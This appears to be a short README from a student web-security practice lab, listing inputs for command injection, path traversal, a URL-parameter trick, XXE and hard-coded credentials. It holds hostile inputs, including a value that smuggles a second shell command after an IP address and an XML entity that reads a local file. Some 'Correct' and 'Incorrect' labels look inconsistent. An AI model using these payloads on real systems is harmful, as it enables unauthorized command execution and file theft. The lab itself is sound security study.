# 1. Command injection exploit

> ### Get the IP address of the machine
> ```cmd
>     pconfig | findstr /R /C:"IPv4 Address" 
> ```


> ### Fill input filed with matching IP address
> ```text
>     192.168.1.103 && echo \"Hello, this is Command injection exploit attack\"
> ```

# 2. Path traversal for flag access

> ### Correct
>
> ```text
>     info.txt
> ```

> ### Inorrect
>
> ```text
>     ../Aleksandar/info.txt
> ```

# 3. Server side request forgery

> ### Add to URL
>
> ```text
>     &Password=true
> ```

# 4. XXE

> ### Correct
>
> ```xml
> <?xml version="1.0"?>
> 
> <!DOCTYPE user [
>         <!ELEMENT user (info)>
>         <!ELEMENT info (#PCDATA)>
>         <!ENTITY xxe SYSTEM "file:///C:/Users/kaoko/Documents/Rider/RBS-Practise/WebApplication1/wwwroot/Data/Aleksandar/info.txt">
>         ]>
> <user>
>     <info>&xxe;</info>
> </user>

> ### Inorrect
>
> ```xml
> <?xml version="1.0"?>
>
> <!DOCTYPE user [
>        <!ELEMENT user (info)>
>        <!ELEMENT info (#PCDATA)>
>        ]>
> <user>
>    <info>Ja sam Aca.</info>
> </user>
> ```

# 5. Hard coded input

> ### Inorrect
>
> ```text
> username: admin
> password: unsafe
> ```

> ### Correct
>
> ```text
> username: admin
> password: safe
> ```




